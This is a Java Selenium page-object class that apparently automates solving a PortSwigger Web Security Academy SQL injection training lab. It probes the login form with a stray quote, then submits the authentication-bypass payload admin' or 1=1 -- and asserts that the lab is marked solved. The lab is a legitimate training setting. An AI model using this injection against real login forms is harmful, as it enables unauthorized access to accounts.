package sa.osama_alharbi.cyber.pages.SQLInj;

import io.qameta.allure.Step;
import lombok.extern.slf4j.Slf4j;
import org.junit.jupiter.api.Assertions;
import org.openqa.selenium.By;
import sa.osama_alharbi.cyber.core.TestBase;
import sa.osama_alharbi.cyber.service.ActionsBotService;

@Slf4j
public class SQLInjectionLab2Page {
    private final TestBase base;
    private final ActionsBotService bot;
    private final String url;

    public SQLInjectionLab2Page(TestBase base, String subDomain) {
        this.base = base;
        this.bot = this.base.actionsBotService;
        this.url = "https://"+subDomain+".web-security-academy.net/";
    }

    @Step("Go To")
    public SQLInjectionLab2Page goTo(){
        bot.navigate(url);
        return this;
    }

    @Step("Check is not solved")
    public SQLInjectionLab2Page checkIsNotSolved(){
        bot.capturingScreenshotEvidence(By.cssSelector("div.widgetcontainer-lab-status"),By.cssSelector("div.widgetcontainer-lab-status>p"));
        Assertions.assertTrue(bot.getText(By.cssSelector("div.widgetcontainer-lab-status>p")).equals("Not solved"),"How we can start SQL injection vulnerability and it solved");
        return this;
    }

    @Step("Check is solved")
    public SQLInjectionLab2Page checkIsSolved(){
        bot.capturingScreenshotEvidence(By.cssSelector("div.widgetcontainer-lab-status"),By.cssSelector("div.widgetcontainer-lab-status>p"));
        Assertions.assertTrue(bot.getText(By.cssSelector("div.widgetcontainer-lab-status>p")).equals("Solved"),"SQL injection vulnerability is Not Solved");
        return this;
    }

    @Step("find the vulnerability")
    public SQLInjectionLab2Page findVulnerability(){
        bot.navigate(url+"login");
        bot.type(By.cssSelector("input[name='username']"),"admin'");
        bot.type(By.cssSelector("input[name='password']"),"123");
        bot.submit(By.cssSelector("button.button"));
        bot.waitDisplay(By.tagName("pre"));
        bot.capturingScreenshotEvidence(By.tagName("body"),By.tagName("pre"));
        Assertions.assertEquals("Internal Server Error",bot.getText(By.tagName("body")),"there is no SQL injection vulnerability");
        return this;
    }

    @Step("start attack by append \"' or 1=1 --\" to username input")
    public SQLInjectionLab2Page attack(){
        bot.navigate(url+"login");
        bot.type(By.cssSelector("input[name='username']"),"admin' or 1=1 --");
        bot.type(By.cssSelector("input[name='password']"),"123");
        bot.submit(By.cssSelector("button.button"));
        bot.waitDisplay(By.id("notification-labsolved"));
        bot.capturingScreenshot(By.id("notification-labsolved"));
        return this;
    }
}
